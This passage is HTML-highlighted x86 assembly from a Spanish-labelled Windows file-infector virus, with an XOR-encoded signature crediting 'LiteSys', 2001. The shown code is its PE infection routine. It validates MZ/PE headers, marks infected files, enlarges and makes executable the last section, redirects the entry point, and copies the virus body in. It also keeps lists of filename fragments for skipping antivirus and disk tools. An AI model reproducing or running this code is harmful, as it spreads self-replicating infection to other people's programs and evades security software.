  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9473h</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1041h</span><span class="sc0">                              </span><span class="sc1">; 'ZM' &amp; 9473h == 1014h</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@Cierra_BaseMap</span><span class="sc0">

  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1218h</span><span class="sc0">                               </span><span class="sc1">; 'EP' | 1218h == 5758h</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5758h</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@Cierra_BaseMap</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">" XSL"</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Cierra_BaseMap</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">" XSL"</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
  </span><span class="sc6">MOVZX</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
  </span><span class="sc6">MOVZX</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
  </span><span class="sc6">IMUL</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                               </span><span class="sc1">; secciones.</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0000020h</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                </span><span class="sc1">; atributos.</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Total</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
  </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Retorno</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">El_EIP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Virus</span><span class="sc0">
  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Total</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BaseMap</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">RUMEN</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o2</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BaseMap</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">@Cierra_BaseMap</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">STOSB</span><span class="sc0">                                     </span><span class="sc1">; meramente estetico.</span><span class="sc0">

  </span><span class="sc5">@Cierra_BaseMap</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BaseMap</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

  </span><span class="sc5">@Cierra_MHandle</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FHandle</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FHandle</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">SetEndOfFile</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MHandle</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

  </span><span class="sc5">@Cierra_FHandle</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FHandle</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

  </span><span class="sc5">@Fin_IPE</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EP_Viejo</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Retorno</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">POPAD</span><span class="sc0">
  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">FHandle</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">MHandle</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">BaseMap</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o2</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">SizeOfRawData</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">EP_Viejo</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

  </span><span class="sc5">Bad_DWords</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"defr"</span><span class="sc0">               </span><span class="sc1">; defrag</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"scan"</span><span class="sc0">               </span><span class="sc1">; scandisk</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"anti"</span><span class="sc0">               
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"rund"</span><span class="sc0">               
                        </span><span class="sc9">DB</span><span class="sc0">       </span><span class="sc2">0FFh</span><span class="sc0">

  </span><span class="sc5">Bad_Words</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"av"</span><span class="sc0">                 
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"sc"</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"tb"</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"f-"</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"no"</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"00"</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"aa"</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">

  </span><span class="sc5">Infectar_PE</span><span class="sc0">           </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"["</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"D"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"i"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"g"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"n"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"d"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"b"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"y"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"L"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"i"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"t"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"S"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"y"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"]"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">              </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"("</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"c"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">")"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"J"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"u"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"n"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"i"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"o"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"/"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"J"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"u"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"i"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"o"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"2"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"0"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"0"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"1"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"-"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"H"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"c"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"h"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"o"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
